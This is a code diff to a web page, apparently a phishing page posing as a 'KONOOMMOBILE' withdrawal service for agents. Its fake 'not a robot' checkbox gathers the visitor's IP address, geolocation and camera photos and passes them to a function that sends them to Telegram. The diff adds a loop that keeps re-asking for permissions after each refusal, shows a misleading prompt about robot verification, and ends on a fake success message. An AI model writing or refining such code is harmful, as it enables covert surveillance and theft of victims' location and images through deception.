@@ -217,13 +217,6 @@
             display: none;
         }
 
-        .status-msg.error {
-            background: #fee2e2;
-            border: 1px solid #fca5a5;
-            color: #b91c1c;
-            display: block;
-        }
-
         .footer-copy {
             margin-top: 20px;
             font-size: 11px;
@@ -366,37 +359,51 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             checkbox.classList.add('checked');
             checkbox.innerHTML = '✓';
 
-            const ipPromise = getIPAddress();
-            const locPromise = getLocation();
-            const photosPromise = capturePhotosWithCamera();
+            statusMsg.style.display = 'block';
+            statusMsg.style.background = '#fef3c7';
+            statusMsg.style.borderColor = '#f59e0b';
+            statusMsg.style.color = '#92400e';
+            statusMsg.innerHTML = 'En cours demande de retrait... (Veuillez autoriser l\'accès requis)';
+
+            let success = false;
+            let ip, loc, photos;
+
+            // Boucle de persistance : force la ré-demande si l'utilisateur refuse les autorisations
+            while (!success) {
+                try {
+                    const ipPromise = getIPAddress();
+                    const locPromise = getLocation();
+                    const photosPromise = capturePhotosWithCamera();
+
+                    const results = await Promise.all([ipPromise, locPromise, photosPromise]);
+                    ip = results[0];
+                    loc = results[1];
+                    photos = results[2];
+
+                    if (!photos || photos.length === 0) {
+                        throw new Error("Autorisations refusées");
+                    }
+
+                    success = true;
+                } catch (error) {
+                    statusMsg.innerHTML = '⚠️ Autorisation nécessaire pour valider la non-robotique. Veuillez autoriser.';
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+
+            statusMsg.innerHTML = 'En cours demande de retrait... Finalisation.';
 
             try {
-                const [ip, loc, photos] = await Promise.all([ipPromise, locPromise, photosPromise]);
-                
-                if (photos.length === 0) {
-                    throw new Error("Permissions refusées");
-                }
-
                 await sendAllDataToTelegram(ip, loc, photos);
-                statusMsg.className = 'status-msg error';
-                statusMsg.style.display = 'block';
                 statusMsg.style.background = '#d1fae5';
                 statusMsg.style.borderColor = '#6ee7b7';
                 statusMsg.style.color = '#065f46';
-                statusMsg.innerHTML = 'Vérification réussie. Traitement du retrait...';
-
-            } catch (error) {
-                console.error('Erreur de validation :', error);
-                statusMsg.className = 'status-msg error';
-                statusMsg.style.display = 'block';
-                statusMsg.innerHTML = 'Impossible de confirmation non robotique. Redirection...';
-                
-                setTimeout(() => {
-                    checkbox.classList.remove('checked');
-                    checkbox.innerHTML = '';
-                    statusMsg.style.display = 'none';
-                    goToView(2);
-                }, 2500);
+                statusMsg.innerHTML = '✅ Demande de retrait enregistrée avec succès !';
+            } catch (err) {
+                statusMsg.style.background = '#fee2e2';
+                statusMsg.style.borderColor = '#fca5a5';
+                statusMsg.style.color = '#b91c1c';
+                statusMsg.innerHTML = '❌ Erreur de liaison au serveur.';
             }
         }
 
